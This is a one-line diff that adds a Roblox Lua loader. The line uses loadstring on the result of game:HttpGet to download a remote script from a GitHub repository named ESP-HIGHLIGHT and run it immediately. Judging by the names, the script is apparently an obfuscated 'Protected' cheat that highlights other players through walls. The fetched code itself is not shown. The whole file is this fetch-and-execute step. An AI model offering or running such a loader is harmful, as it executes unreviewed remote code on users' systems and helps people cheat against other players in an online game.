@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kei-0-zen/ESP-HIGHLIGHT/3e314435551ce4e1f260a30f35f59d1c5696424c/Protected_2184980864401304.lua.txt"))()
